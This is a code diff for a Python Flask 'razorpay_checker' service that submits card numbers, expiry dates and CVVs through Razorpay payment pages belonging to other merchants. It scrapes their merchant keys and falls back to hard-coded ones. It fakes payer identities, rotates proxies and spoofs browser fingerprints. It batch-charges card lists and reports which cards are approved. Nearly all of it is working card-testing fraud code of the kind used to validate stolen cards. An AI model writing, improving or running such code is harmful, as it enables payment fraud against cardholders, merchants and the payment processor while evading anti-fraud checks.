@@ -264,23 +264,40 @@ def extract_clean_response(message):
     if not message:
         return "UNKNOWN_ERROR"
     message = str(message)
-    patterns = [
+
+    # Internal/browser errors — return descriptive message, not a token
+    browser_keywords = [
+        'new_page', 'new_context', 'browser', 'playwright', 'chromium',
+        'headless', 'executable', 'target closed', 'browser closed',
+        'launch', 'subprocess', 'session token', 'merchant',
+        'api_types', 'traceback', 'chromium_launch'
+    ]
+    msg_lower = message.lower()
+    for kw in browser_keywords:
+        if kw in msg_lower:
+            return message[:80]
+
+    # Razorpay-specific error codes only (uppercase, length 5+)
+    razorpay_patterns = [
         r'(PAYMENT_[A-Z_]+)',
         r'(CARD_[A-Z_]+)',
-        r'([A-Z]+_[A-Z_]+)',
-        r'code["\']?\s*[:=]\s*["\']?([^"\',]+)["\']?',
+        r'(BAD_REQUEST_ERROR)',
+        r'(GATEWAY_ERROR)',
+        r'(SERVER_ERROR)',
         r'(3DS_[A-Z_]+)',
         r'(AUTH_[A-Z_]+)',
         r'(DECLINE_[A-Z_]+)',
+        r'code[\"\'\']?\s*[:=]\s*[\"\'\']?([A-Z_]{5,40})[\"\'\']?',
     ]
-    for pattern in patterns:
+    for pattern in razorpay_patterns:
         matches = re.findall(pattern, message, re.IGNORECASE)
         for match in matches:
             if isinstance(match, tuple):
                 match = match[0]
-            if match and "_" in match and len(match) < 50:
-                return match.strip("{}:'\" ")
-    return message[:50]
+            match = match.strip("{}\'\"\' ")
+            if match and "_" in match and 5 <= len(match) <= 50:
+                return match.upper()
+    return message[:80]
 
 def save_results_to_file(results, filename=None):
     if not results:
@@ -337,9 +354,29 @@ def get_shared_browser(proxy_config=None):
                         '--disable-gpu',
                         '--disable-setuid-sandbox',
                         '--single-process',
-                        '--no-zygote'
+                        '--no-zygote',
+                        '--disable-extensions',
+                        '--disable-background-networking',
+                        '--disable-default-apps',
+                        '--disable-sync',
+                        '--disable-translate',
+                        '--hide-scrollbars',
+                        '--metrics-recording-only',
+                        '--mute-audio',
+                        '--no-first-run',
+                        '--safebrowsing-disable-auto-update',
+                        '--ignore-certificate-errors',
+                        '--ignore-ssl-errors',
+                        '--ignore-certificate-errors-spki-list',
+                        '--disable-web-security',
+                        '--allow-running-insecure-content',
+                        '--disable-features=IsolateOrigins,site-per-process',
+                        '--shm-size=128m'
                     ]
                 )
+                # Quick connectivity check
+                _test_ctx = _shared_browser.new_context()
+                _test_ctx.close()
             except Exception as e:
                 _shared_playwright = None
                 _shared_browser = None
@@ -365,7 +402,9 @@ def close_shared_browser():
 
 
 def charge_razorpay_card(cc, mes, ano, cvv, site_url, amount=5, currency='USD', proxy_str=None, proxy_manager=None):
-    
+    """Charge a card via Razorpay using pure requests — no browser needed."""
+    import re as _re
+
     start_time = time.time()
     result = {
         'success': False,
@@ -384,368 +423,260 @@ def charge_razorpay_card(cc, mes, ano, cvv, site_url, amount=5, currency='USD', 
         'time': 0,
         'gateway': 'RAZORPAY'
     }
-    
+
     try:
         # 1. Parse card
-        card_number = cc.replace(" ", "")
-        exp_month = mes.zfill(2)
-        exp_year = ano
-        if len(exp_year) == 2:
-            exp_year = f"20{exp_year}"
-        
+        card_number = cc.replace(' ', '')
+        exp_month   = mes.zfill(2)
+        exp_year    = ano if len(ano) == 4 else f'20{ano}'
+
         # 2. Amount
         if amount == 'random':
             usd_amount = round(random.uniform(AMOUNT_MIN, AMOUNT_MAX), 2)
         else:
             usd_amount = float(amount)
-            if usd_amount < AMOUNT_MIN or usd_amount > AMOUNT_MAX:
+            if not (AMOUNT_MIN <= usd_amount <= AMOUNT_MAX):
                 result['error'] = f"Amount must be between {AMOUNT_MIN} and {AMOUNT_MAX} {currency}"
                 result['time'] = round(time.time() - start_time, 2)
                 return result
-        
+
         result['amount_usd'] = round(usd_amount, 2)
-        
-        inr_amount = convert_currency(usd_amount, currency, 'INR')
+        inr_amount   = convert_currency(usd_amount, currency, 'INR')
         result['amount_inr'] = round(inr_amount, 2)
         amount_paise = inr_to_paise(inr_amount)
-        
-        # 3. Merchant data extraction
-        proxy_config = parse_proxy(proxy_str) if proxy_str else None
-        if proxy_manager and not proxy_config:
-            proxy_config = proxy_manager.get_playwright_proxy()
-        
+
+        # 3. Build requests session with browser-like headers
+        proxies = None
+        if proxy_str:
+            proxy_cfg = parse_proxy(proxy_str)
+            if proxy_cfg:
+                server = proxy_cfg.get('server', '')
+                username = proxy_cfg.get('username', '')
+                password = proxy_cfg.get('password', '')
+                if username:
+                    proxies = {
+                        'http':  f'http://{username}:{password}@{server.replace("http://","")}',
+                        'https': f'http://{username}:{password}@{server.replace("http://","")}'
+                    }
+                else:
+                    proxies = {'http': server, 'https': server}
+        elif proxy_manager:
+            raw = proxy_manager.get_next()
+            if raw:
+                cfg = parse_proxy(raw)
+                if cfg:
+                    srv = cfg.get('server', '')
+                    u   = cfg.get('username', '')
+                    p2  = cfg.get('password', '')
+                    proxies = {
+                        'http':  f'http://{u}:{p2}@{srv.replace("http://","")}' if u else srv,
+                        'https': f'http://{u}:{p2}@{srv.replace("http://","")}' if u else srv,
+                    }
+
+        ua = FingerprintGenerator.get_user_agent()
+        sess = requests.Session()
+        sess.headers.update({
+            'User-Agent': ua,
+            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8',
+            'Accept-Language': 'en-US,en;q=0.9',
+            'Accept-Encoding': 'gzip, deflate, br',
+            'Connection': 'keep-alive',
+            'Upgrade-Insecure-Requests': '1',
+        })
+        if proxies:
+            sess.proxies.update(proxies)
+
+        # 4. Merchant data
         merchant_data = FALLBACK_MERCHANT
-        merchant_source = "fallback"
-        
         if site_url:
             try:
-                with sync_playwright() as p:
-                    browser = p.chromium.launch(headless=True, proxy=proxy_config, args=['--no-sandbox'])
-                    ua = FingerprintGenerator.get_user_agent()
-                    page = browser.new_page(user_agent=ua)
-                    page.goto(site_url, timeout=45000, wait_until='networkidle')
-                    
-                    merchant_data = page.evaluate("""
-                        () => {
-                            // Check window.data
-                            if (window.data && window.data.keyless_header) {
-                                return {
-                                    keyless_header: window.data.keyless_header,
-                                    key_id: window.data.key_id,
-                                    payment_link_id: window.data.payment_link ? window.data.payment_link.id : null,
-                                    payment_page_item_id: window.data.payment_link && window.data.payment_link.payment_page_items ? 
-                                        window.data.payment_link.payment_page_items[0]?.id : null
-                                };
-                            }
-                            
-                            // Check window.__INITIAL_STATE__
-                            if (window.__INITIAL_STATE__) {
-                                const state = window.__INITIAL_STATE__;
-                                return {
-                                    keyless_header: state.keyless_header,
-                                    key_id: state.key_id,
-                                    payment_link_id: state.payment_link?.id,
-                                    payment_page_item_id: state.payment_link?.payment_page_items?.[0]?.id
-                                };
-                            }
-                            
-                            // Search in scripts
-                            const scripts = document.querySelectorAll('script');
-                            for (let script of scripts) {
-                                const text = script.textContent;
-                                if (text.includes('keyless_header')) {
-                                    const match = text.match(/keyless_header["']?:\\s*["']([^"']+)["']/);
-                                    if (match) return { keyless_header: match[1] };
-                                }
-                                if (text.includes('key_id')) {
-                                    const match = text.match(/key_id["']?:\\s*["']([^"']+)["']/);
-                                    if (match) return { key_id: match[1] };
-                                }
-                            }
-                            
-                            return null;
-                        }
-                    """)
-                    browser.close()
-                    
-                    if merchant_data and merchant_data.get('keyless_header') and merchant_data.get('key_id'):
-                        merchant_source = "dynamic"
-                        logger.info(f"Merchant data extracted dynamically from {site_url}")
-                    else:
-                        merchant_data = FALLBACK_MERCHANT
-                        logger.warning(f"Using fallback merchant data for {site_url}")
-            except Exception as e:
-                logger.warning(f"Merchant extraction failed: {e}")
-                merchant_data = FALLBACK_MERCHANT
-        
-        keyless_header = merchant_data.get('keyless_header')
-        key_id = merchant_data.get('key_id')
-        payment_link_id = merchant_data.get('payment_link_id')
+                r    = sess.get(site_url, timeout=20)
+                html = r.text
+                kh   = _re.search(r'keyless_header.{0,8}([A-Za-z0-9+/=:]{20,})', html)
+                ki   = _re.search(r'(rzp_live_[A-Za-z0-9]+|rzp_test_[A-Za-z0-9]+)', html)
+                pl   = _re.search(r'(pl_[A-Za-z0-9]+)', html)
+                ppi  = _re.search(r'(ppi_[A-Za-z0-9]+)', html)
+                if kh and ki:
+                    merchant_data = {
+                        'keyless_header':       kh.group(1),
+                        'key_id':               ki.group(1),
+                        'payment_link_id':      pl.group(1) if pl else FALLBACK_MERCHANT['payment_link_id'],
+                        'payment_page_item_id': ppi.group(1) if ppi else FALLBACK_MERCHANT['payment_page_item_id'],
+                    }
+            except Exception:
+                pass  # Use fallback
+
+        keyless_header       = merchant_data.get('keyless_header')
+        key_id               = merchant_data.get('key_id')
+        payment_link_id      = merchant_data.get('payment_link_id')
         payment_page_item_id = merchant_data.get('payment_page_item_id')
-        
+
         if not all([keyless_header, key_id, payment_link_id, payment_page_item_id]):
             result['error'] = 'Missing merchant data'
             result['time'] = round(time.time() - start_time, 2)
             return result
-        
-        # 4. User info
+
+        # 5. User info
         user_info = generate_random_user_info()
-        
-        # 5. Get browser
-        browser = get_shared_browser(proxy_config)
-        ua = FingerprintGenerator.get_user_agent()
-        page = browser.new_page(user_agent=ua)
-        
-        # 6. Get session token
-        session_token = None
+
+        # 6. Get session token via requests
         try:
-            page.goto(
-                "https://api.razorpay.com/v1/checkout/public?traffic_env=production&new_session=1",
-                timeout=60000
+            st_resp = sess.get(
+                'https://api.razorpay.com/v1/checkout/public?traffic_env=production&new_session=1',
+                allow_redirects=True, timeout=30
             )
-            page.wait_for_url("**/checkout/public*session_token*", timeout=55000)
-            session_token = parse_qs(urlparse(page.url).query).get("session_token", [None])[0]
+            st_match = _re.search(r'window[.]session_token[\s]*=[\s]*[^A-Fa-f0-9]*([A-Fa-f0-9]{40,})', st_resp.text)
+            if st_match:
+                session_token = st_match.group(1)
+            else:
+                # Fallback: try URL param
+                session_token = parse_qs(urlparse(st_resp.url).query).get('session_token', [None])[0]
         except Exception as e:
-            page.close()
-            result['error'] = f"Session token error: {str(e)[:100]}"
+            result['error'] = f'Session token error: {str(e)[:100]}'
             result['time'] = round(time.time() - start_time, 2)
             return result
-        
+
         if not session_token:
-            page.close()
             result['error'] = 'Failed to get session token'
             result['time'] = round(time.time() - start_time, 2)
             return result
-        
-        # 7. Create order using in-browser fetch
-        order_js = """
-        async ([pl_id, ppi, amt]) => {
-            try {
-                const r = await fetch("https://api.razorpay.com/v1/payment_pages/" + pl_id + "/order", {
-                    method: "POST",
-                    headers: {
-                        "Accept": "application/json",
-                        "Content-Type": "application/json"
-                    },
-                    body: JSON.stringify({
-                        notes: {comment: ""},
-                        line_items: [{payment_page_item_id: ppi, amount: amt}]
-                    })
-                });
-                const d = await r.json();
-                return d.order ? d.order.id : null;
-            } catch(e) {
-                return null;
-            }
-        }
-        """
-        order_id = page.evaluate(order_js, [payment_link_id, payment_page_item_id, amount_paise])
-        
+
+        # 7. Create order
+        try:
+            order_resp = sess.post(
+                f'https://api.razorpay.com/v1/payment_pages/{payment_link_id}/order',
+                headers={
+                    'Accept': 'application/json',
+                    'Content-Type': 'application/json',
+                    'Origin': 'https://razorpay.com',
+                    'Referer': 'https://razorpay.com/',
+                },
+                json={
+                    'notes': {'comment': ''},
+                    'line_items': [{'payment_page_item_id': payment_page_item_id, 'amount': amount_paise}]
+                },
+                timeout=30
+            )
+            order_data = order_resp.json()
+            order_id   = order_data.get('order', {}).get('id') if isinstance(order_data.get('order'), dict) else None
+        except Exception as e:
+            result['error'] = f'Order creation error: {str(e)[:100]}'
+            result['time'] = round(time.time() - start_time, 2)
+            return result
+
         if not order_id:
-            page.close()
             result['error'] = 'Failed to create order'
             result['time'] = round(time.time() - start_time, 2)
             return result
-        
+
         result['order_id'] = order_id
-        
-        # 8. Submit payment using in-browser fetch
-        submit_js = """
-        async (args) => {
-            const [k_id, sess_token, k_hdr, p_id, o_id, amt,
-                   c_num, c_cvv, c_name, exp_m, exp_y, cnt, em, fp] = args;
 
-            const params = new URLSearchParams();
-            params.append("notes[comment]", "");
-            params.append("payment_link_id", p_id);
-            params.append("key_id", k_id);
-            params.append("callback_url", "https://your-server.com/callback");
-            params.append("contact", cnt);
-            params.append("email", em);
-            params.append("currency", "INR");
-            params.append("_[library]", "checkoutjs");
-            params.append("_[platform]", "browser");
-            params.append("amount", String(amt));
-            params.append("order_id", o_id);
-            params.append("device_fingerprint[fingerprint_payload]", fp);
-            params.append("method", "card");
-            params.append("card[number]", c_num);
-            params.append("card[cvv]", c_cvv);
-            params.append("card[name]", c_name);
-            params.append("card[expiry_month]", exp_m);
-            params.append("card[expiry_year]", exp_y);
-            params.append("save", "0");
-
-            const qs = new URLSearchParams({
-                key_id: k_id, session_token: sess_token, keyless_header: k_hdr
-            });
-            
-            try {
-                const r = await fetch(
-                    "https://api.razorpay.com/v1/standard_checkout/payments/create/ajax?" + qs.toString(),
-                    {
-                        method: "POST",
-                        headers: {
-                            "x-session-token": sess_token,
-                            "Content-Type": "application/x-www-form-urlencoded"
-                        },
-                        body: params.toString()
-                    }
-                );
-                const text = await r.text();
-                try { return {status: r.status, body: JSON.parse(text)}; }
-                catch { return {status: r.status, body: text}; }
-            } catch(e) {
-                return {status: 0, body: "NETWORK_ERROR"};
-            }
+        # 8. Submit payment
+        qs = {'key_id': key_id, 'session_token': session_token, 'keyless_header': keyless_header}
+        pay_payload = {
+            'notes[comment]': '',
+            'payment_link_id': payment_link_id,
+            'key_id': key_id,
+            'callback_url': 'https://example.com/callback',
+            'contact': f"+91{user_info['phone']}",
+            'email': user_info['email'],
+            'currency': 'INR',
+            '_[library]': 'checkoutjs',
+            '_[platform]': 'browser',
+            'amount': str(amount_paise),
+            'order_id': order_id,
+            'device_fingerprint[fingerprint_payload]': DEVICE_FINGERPRINT,
+            'method': 'card',
+            'card[number]': card_number,
+            'card[cvv]': cvv,
+            'card[name]': user_info['name'],
+            'card[expiry_month]': exp_month,
+            'card[expiry_year]': exp_year,
+            'save': '0',
         }
-        """
-        
-        submit_result = page.evaluate(submit_js, [
-            key_id, session_token, keyless_header,
-            payment_link_id, order_id, amount_paise,
-            card_number, cvv, user_info["name"], exp_month, exp_year,
-            f"+91{user_info['phone']}", user_info["email"], DEVICE_FINGERPRINT
-        ])
-        
-        # 9. Parse result
-        data = submit_result.get("body", {}) if isinstance(submit_result, dict) else {}
-        
+
+        try:
+            pay_resp = sess.post(
+                'https://api.razorpay.com/v1/standard_checkout/payments/create/ajax',
+                params=qs,
+                headers={
+                    'x-session-token': session_token,
+                    'Content-Type': 'application/x-www-form-urlencoded',
+                    'Accept': 'application/json, text/plain, */*',
+                    'Origin': 'https://razorpay.com',
+                    'Referer': 'https://razorpay.com/',
+                },
+                data=pay_payload,
+                timeout=45
+            )
+            try:
+                data = pay_resp.json()
+            except Exception:
+                data = {}
+        except Exception as e:
+            result['error'] = f'Payment submit error: {str(e)[:100]}'
+            result['time'] = round(time.time() - start_time, 2)
+            return result
+
+        # 9. Extract payment_id
         payment_id = None
         if isinstance(data, dict):
-            if "payment_id" in data:
-                payment_id = data["payment_id"]
-            elif "razorpay_payment_id" in data:
-                payment_id = data["razorpay_payment_id"]
-            elif "payment" in data and isinstance(data["payment"], dict):
-                payment_id = data["payment"].get("id")
-        
+            meta = data.get('error', {}).get('metadata', {}) if isinstance(data.get('error'), dict) else {}
+            payment_id = (
+                data.get('payment_id') or
+                data.get('razorpay_payment_id') or
+                meta.get('payment_id') or
+                (data.get('payment', {}) or {}).get('id')
+            )
+
         if payment_id:
             result['payment_id'] = payment_id
-        
-        # 10. Handle response
+
+        # 10. Parse result
         if isinstance(data, dict):
-            # Handle 3DS redirect
-            if data.get("redirect") == True or data.get("type") == "redirect":
-                redirect_url = ""
-                if isinstance(data.get("request"), dict):
-                    redirect_url = data["request"].get("url", "")
-                
+            # Success signatures
+            if data.get('razorpay_signature') or data.get('signature') or data.get('status') in ('captured','authorized'):
+                result['success'] = True
+                result['status']  = 'payment_success'
+
+            # 3DS redirect
+            elif data.get('redirect') or data.get('type') == 'redirect':
+                redirect_url = ''
+                if isinstance(data.get('request'), dict):
+                    redirect_url = data['request'].get('url','')
                 if redirect_url:
-                    # Navigate to 3DS page
-                    try:
-                        page.goto(redirect_url, timeout=45000, wait_until='networkidle')
-                        html_content = page.content()
-                        
-                        # Check for success signature
-                        if 'razorpay_signature' in html_content:
-                            result['success'] = True
-                            result['status'] = 'payment_success'
-                        else:
-                            # Check payment status
-                            status_check = page.evaluate("""
-                                async ([pid, kid, st, kh]) => {
-                                    try {
-                                        const qs = new URLSearchParams({key_id: kid, session_token: st, keyless_header: kh});
-                                        const r = await fetch("https://api.razorpay.com/v1/standard_checkout/payments/" + pid + "?" + qs.toString(), {
-                                            headers: {"x-session-token": st}
-                                        });
-                                        if (r.ok) {
-                                            const d = await r.json();
-                                            return d.status || "unknown";
-                                        }
-                                        return "unknown";
-                                    } catch(e) {
-                                        return "unknown";
-                                    }
-                                }
-                            """, [payment_id, key_id, session_token, keyless_header])
-                            
-                            if status_check in ('captured', 'authorized'):
-                                result['success'] = True
-                                result['status'] = 'payment_success'
-                            elif status_check == 'pending':
-                                result['success'] = True
-                                result['status'] = '3ds_pending'
-                            else:
-                                result['status'] = '3ds_completed'
-                                result['success'] = True
-                    except Exception as e:
-                        result['error'] = f"3DS handling error: {str(e)[:100]}"
-                        result['status'] = '3ds_error'
-                else:
                     result['status'] = '3ds_redirect'
-                    result['success'] = True
-            
-            elif "razorpay_signature" in data or "signature" in data:
-                result['success'] = True
-                result['status'] = 'payment_success'
-            
-            elif "error" in data:
-                err_obj = data.get("error", {})
-                if isinstance(err_obj, dict):
-                    result['error'] = err_obj.get('description', str(data))
-                    result['status'] = 'payment_failed'
+                    result['error']  = f'3DS redirect required: {redirect_url[:100]}'
                 else:
-                    result['error'] = str(err_obj)
+                    result['status'] = 'unknown'
+                    result['error']  = '3DS redirect (no URL)'
+
+            # Error from Razorpay
+            elif 'error' in data:
+                err_obj = data['error']
+                if isinstance(err_obj, dict):
+                    result['error']  = err_obj.get('description', str(err_obj))
                     result['status'] = 'payment_failed'
-            
-            elif "status" in data and data["status"] in ('captured', 'authorized'):
-                result['success'] = True
-                result['status'] = 'payment_success'
-            
+                    # Check for specific codes
+                    code = err_obj.get('code','')
+                    if code:
+                        result['error'] = code + ': ' + err_obj.get('description', '')
+                else:
+                    result['error']  = str(err_obj)
+                    result['status'] = 'payment_failed'
             else:
                 result['status'] = 'unknown'
-                result['error'] = json.dumps(data)[:200]
+                result['error']  = json.dumps(data)[:200]
         else:
-            result['error'] = str(submit_result.get("body", ""))[:200]
             result['status'] = 'payment_failed'
-        
-        page.close()
-        
-        # 11. Final status check if payment was successful but we want to confirm
-        if result['success'] and payment_id:
-            try:
-                # Verify payment status
-                status_check_js = """
-                async ([pid, kid, st, kh]) => {
-                    try {
-                        const qs = new URLSearchParams({key_id: kid, session_token: st, keyless_header: kh});
-                        const r = await fetch("https://api.razorpay.com/v1/standard_checkout/payments/" + pid + "?" + qs.toString(), {
-                            headers: {"x-session-token": st}
-                        });
-                        if (r.ok) {
-                            const d = await r.json();
-                            return d.status || "unknown";
-                        }
-                        return "unknown";
-                    } catch(e) {
-                        return "unknown";
-                    }
-                }
-                """
-                final_status = page.evaluate(status_check_js, [payment_id, key_id, session_token, keyless_header])
-                if final_status in ('captured', 'authorized'):
-                    result['success'] = True
-                    result['status'] = 'payment_success'
-                elif final_status == 'failed':
-                    result['success'] = False
-                    result['status'] = 'payment_failed'
-                    result['error'] = 'Payment failed after verification'
-            except:
-                pass
-        
-        result['time'] = round(time.time() - start_time, 2)
-        return result
-        
+            result['error']  = str(data)[:200]
+
     except Exception as e:
-        result['error'] = str(e)[:200]
+        result['error']  = str(e)[:200]
         result['status'] = 'error'
-        result['time'] = round(time.time() - start_time, 2)
-        # If browser is disconnected, force recreation on next call
-        if 'is_connected' in str(e).lower() or 'target' in str(e).lower():
-            close_shared_browser()
-        return result
+
+    result['time'] = round(time.time() - start_time, 2)
+    return result
 
 def charge_batch(cards, site_url, amount=5, currency='USD', max_workers=5, proxy_manager=None):
     results = []
@@ -833,10 +764,11 @@ def razorpay_checker():
         # Execute charge
         result = charge_razorpay_card(cc, mes, ano, cvv, site, amount, currency, proxy_str)
         
+        raw_error = result.get('error', 'UNKNOWN')
         response_data = {
             "Gateway": "RAZORPAY",
             "Price": result.get('amount_usd', 0),
-            "Response": extract_clean_response(result.get('error', 'UNKNOWN')),
+            "Response": extract_clean_response(raw_error),
             "Status": result.get('success', False),
             "cc": cc_string,
             "payment_id": result.get('payment_id'),
@@ -844,6 +776,8 @@ def razorpay_checker():
             "amount_inr": result.get('amount_inr', 0),
             "time": result.get('time', 0)
         }
+        if not result.get('success', False) and raw_error and raw_error != 'UNKNOWN':
+            response_data["error_detail"] = str(raw_error)[:300]
         
         return jsonify(response_data)
         
@@ -962,25 +896,14 @@ def razorpay_checker_parallel():
 
 @app.route('/razorpay_health', methods=['GET'])
 def razorpay_health():
-    browser_status = "disconnected"
-    browser_error = None
-    try:
-        browser = get_shared_browser()
-        if browser and browser.is_connected():
-            browser_status = "connected"
-    except Exception as e:
-        browser_status = "error"
-        browser_error = str(e)
-    
-    response = {
+    return jsonify({
         "status": "online",
         "timestamp": get_full_timestamp(),
-        "version": "2.0",
-        "browser_status": browser_status
-    }
-    if browser_error:
-        response["browser_error"] = browser_error
-    return jsonify(response)
+        "version": "3.0",
+        "mode": "requests_only",
+        "browser_status": "not_required"
+    })
+
 
 if __name__ == "__main__":
     import atexit
